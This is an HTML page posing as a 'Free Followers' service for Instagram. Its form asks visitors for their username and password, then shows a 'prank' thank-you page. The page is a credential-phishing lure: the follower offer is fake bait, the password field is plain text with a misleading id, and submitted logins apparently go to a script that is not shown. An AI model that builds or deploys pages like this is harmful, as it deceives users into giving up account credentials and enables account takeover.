<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Followers</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <!-- FORM PAGE -->
  <main id="formPage" class="page">
    <div class="card">

      <div class="icon">✦</div>

      <h1>FREE FOLLOWERS</h1>

      <p class="subtitle">
        Get Instagram followers instantly.
      </p>

      <form id="followerForm">

        <label for="instagram">Username</label>

        <input
          id="instagram"
          type="text"
          placeholder="username"
          autocomplete="off"
          required
        >

        <label for="followers">Password</label>

        <input
          id="followers"
          type="text"
          placeholder="Password"
          autocomplete="off"
          required
        >

        <button type="submit">
          SUBMIT
        </button>

      </form>

      <div id="errorMessage" class="error">
        ⚠️ Something went wrong. Please fill the form again.
      </div>

      <p class="notice">
        Thank you for using our service. We will reach you ASAP!
      </p>

    </div>
  </main>


  <!-- PRANK PAGE -->
  <main id="prankPage" class="page prankPage">

    <div class="card prankCard">

      <div class="laugh"></div>

      <h1>Thank You</h1>

      <p class="prankText">
        See you again !!!
      </p>

      <p class="smallText">
        Have A Great Day
      </p>

    </div>

  </main>


  <script type="module" src="script.js"></script>

</body>
</html>
